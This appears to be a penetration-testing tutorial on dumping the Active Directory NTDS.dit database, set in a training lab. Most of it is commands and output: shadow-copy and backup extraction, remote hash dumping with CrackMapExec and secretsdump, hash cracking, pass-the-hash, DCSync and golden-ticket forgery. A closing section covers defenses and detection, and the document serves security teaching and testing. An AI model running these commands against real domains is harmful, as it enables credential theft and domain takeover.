# NTDS.dit

## NTDS Database

The NTDS.dit file is the Active Directory database that stores user accounts, group memberships, password hashes, and other critical domain information. As one of the most valuable targets in a Windows domain environment, understanding how to properly extract and analyze the NTDS.dit can be crucial during penetration testing and security assessments.

### Overview of NTDS.dit

The NTDS.dit (NT Directory Services Directory Information Tree) file:

* Is the primary database for Active Directory Domain Services
* Stores all domain objects including users, groups, and computers
* Contains password hashes for all domain accounts
* Is typically located at `C:\Windows\NTDS\ntds.dit` on domain controllers
* Is locked while Active Directory services are running
* Can contain historical password hashes if enabled in the domain

Unlike the SAM database, which only contains local accounts, NTDS.dit contains information for all domain accounts across the entire Active Directory forest.

### Obtaining NTDS.dit

#### Prerequisites

To extract the NTDS.dit file, you typically need:

* Domain Admin privileges (or equivalent)
* Access to a Domain Controller
* Methods to bypass the file lock

#### Method 1: Using Volume Shadow Copy

One of the most common methods is to create a Volume Shadow Copy (VSS) to bypass the file lock:

```cmd
# Create a shadow copy of the C: drive
C:\> vssadmin CREATE SHADOW /For=C:

# Example output showing the shadow copy path
Shadow Copy ID: {86216c43-df26-4d5c-ab44-6c3e3cc7a54f}
Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

# Copy the NTDS.dit file from the shadow copy
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\ntds.dit

# Copy the SYSTEM registry hive (needed for decryption)
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

#### Method 2: Using Windows Built-in Backup Utilities

Windows provides native tools for backing up Active Directory, which can be leveraged:

```cmd
# Create a directory for the backup
C:\> mkdir C:\ADBackup

# Use Windows Server Backup to create a system state backup
C:\> wbadmin start systemstatebackup -backuptarget:C:\ADBackup -quiet

# Mount the backup
C:\> wbadmin get versions
C:\> mkdir C:\ADRestore
C:\> wbadmin start recovery -version:01/01/2023-00:00 -itemtype:app -items:AD -recoveryTarget:C:\ADRestore -notrestoreacl -quiet

# Access the NTDS.dit file in the backup
# It will typically be in C:\ADRestore\Windows\NTDS\ntds.dit
```

#### Method 3: Using PowerShell and CrackMapExec

For remote extraction, CrackMapExec provides a streamlined approach:

```bash
# Using crackmapexec with domain admin credentials
crackmapexec smb 10.129.201.57 -u administrator -p 'Password123!' --ntds

# Example output (truncated)
SMB         10.129.201.57    445    DC01             [*] Windows Server 2019 Standard 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57    445    DC01             [+] inlanefreight.local\administrator:Password123! (Pwn3d!)
SMB         10.129.201.57    445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.201.57    445    DC01           Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.129.201.57    445    DC01           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.201.57    445    DC01           DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
SMB         10.129.201.57    445    DC01           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
```

### Extracting and Analyzing Hashes

#### Using Secretsdump.py (Impacket)

After obtaining the NTDS.dit and SYSTEM files, you can extract the hashes using Impacket's secretsdump.py:

```bash
# Local extraction from obtained files
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# Direct remote extraction
secretsdump.py domain/administrator:password@10.129.201.57
```

Example output:

```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4e9a9a573a75dc3636f832a956ade4b1
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 3041d1cef5730b37a8110151f5c9a80e
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
inlanefreight.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
inlanefreight.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
inlanefreight.local\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
inlanefreight.local\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
```

#### Understanding the Output

The output format follows this pattern:

* `username:RID:LM hash:NT hash:::`

Where:

* `username` is the user account name
* `RID` is the Relative Identifier
* `LM hash` is the legacy LAN Manager hash (usually the default "no password" value)
* `NT hash` is the NTLM hash of the user's password

#### Additional Hash Types

Secretsdump.py also extracts Kerberos keys and supplementary credentials:

```
# Kerberos keys
Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
Administrator:des-cbc-md5:618c1c5ef780cde3

# Cleartext passwords (if cached)
inlanefreight.local\jdoe:Jd0e_Autumn_2020
```

### Cracking NTDS Hashes

After extracting hashes, they can be cracked to recover plaintext passwords:

#### Using Hashcat

```bash
# Create a file containing NT hashes
echo "64f12cddaa88057e06a81b54e73b949b" > ntds_hashes.txt

# Crack using hashcat
hashcat -m 1000 ntds_hashes.txt /usr/share/wordlists/rockyou.txt
```

Example output:

```
64f12cddaa88057e06a81b54e73b949b:Password1
```

#### Using John the Ripper

```bash
# Create a file in the format john expects
echo "Administrator:$NT$64f12cddaa88057e06a81b54e73b949b" > ntds_for_john.txt

# Crack using john
john --format=NT ntds_for_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Leveraging NTDS Hashes for Attacks

#### Pass-the-Hash Attacks

With obtained NT hashes, you can perform pass-the-hash attacks without cracking:

```bash
# Using CrackMapExec
crackmapexec smb 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b

# Using Impacket's psexec.py
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b administrator@10.129.201.57
```

#### DCSync Attacks

If you compromise an account with DCSync privileges, you can extract NTDS.dit data remotely without direct access to the domain controller:

```bash
# Using Impacket's secretsdump.py
secretsdump.py -just-dc inlanefreight.local/administrator@10.129.201.57
```

#### Golden Ticket Attacks

The `krbtgt` account hash is especially valuable as it can be used to create forged Kerberos tickets:

```bash
# Extract the domain SID
# The krbtgt hash from NTDS.dit
# Create a golden ticket with Impacket's ticketer.py
ticketer.py -nthash cbb8a44ba74b5778a06c2d08b4ced802 -domain-sid S-1-5-21-1210205079-3865622944-1816604788 -domain inlanefreight.local administrator
```

### NTDS.dit Structure and Components

The NTDS.dit file consists of several key components:

1. **Data Table (datatable)**: Contains most Active Directory objects
2. **Link Table**: Maintains relationships between objects
3. **Security Descriptor Table**: Stores access control information
4. **PEK (Password Encryption Key)**: Used to encrypt sensitive attributes like password hashes

#### Encryption in NTDS.dit

Password hashes in NTDS.dit are protected by multiple layers:

1. Encrypted with the PEK (Password Encryption Key)
2. The PEK is encrypted with the Boot Key from the SYSTEM registry hive
3. Modern systems use stronger encryption for newer hash types (e.g., AES keys)

### Defending Against NTDS.dit Extraction

#### Technical Controls

1. **Protected LSASS**: Enable LSA Protection and Credential Guard
2. **Enhanced Auditing**: Monitor for suspicious activities related to NTDS.dit access
3. **Privileged Access Management**: Implement Just-In-Time administration
4. **Regular Backups**: Secure backup procedures for Domain Controllers
5. **ESAE (Enhanced Security Admin Environment)**: Separate administrative forest
6. **Password Policies**: Strong passwords reduce the risk of cracked hashes
7. **Least Privilege**: Restrict accounts with Domain Admin privileges

#### Detection Strategies

Monitor for indicators of NTDS.dit extraction attempts:

1. Creation of Volume Shadow Copies on Domain Controllers
2. Unexpected system state backups
3. Use of tools like vssadmin, diskshadow, or ntdsutil
4. Large data transfers from Domain Controllers
5. Authentication attempts with extracted credentials

### Post-Compromise Cleanup

After security testing activities involving NTDS.dit:

1. **Remove temporary files**: Delete any copies of NTDS.dit and related files
2. **Clean up shadow copies**: Delete any Volume Shadow Copies created
3. **Document actions**: Record all extraction activities for reporting
4. **Report findings**: Provide recommendations for securing the environment

### Differences Between SAM and NTDS.dit

| Feature         | SAM Database                       | NTDS.dit                                      |
| --------------- | ---------------------------------- | --------------------------------------------- |
| Scope           | Local machine accounts             | All domain accounts                           |
| Location        | `%SystemRoot%\System32\config\SAM` | `%SystemRoot%\NTDS\ntds.dit`                  |
| Size            | Small (KB to MB)                   | Large (MB to GB)                              |
| Protected by    | SYSTEM bootkey                     | PEK + SYSTEM bootkey                          |
| Contains        | Local user hashes                  | Domain user hashes, Kerberos keys, group info |
| Historical data | No                                 | Yes (if enabled)                              |
| Replication     | No                                 | Yes (to other DCs)                            |

### Summary

The NTDS.dit database is a critical component of Active Directory that contains sensitive authentication data for all domain users. Understanding how to extract and analyze this database is essential for comprehensive security assessments, but must be performed with proper authorization and care to avoid disrupting domain operations.

When properly handled, NTDS.dit extraction can provide valuable insights into password policies, account security, and potential vulnerabilities in a Windows domain environment.
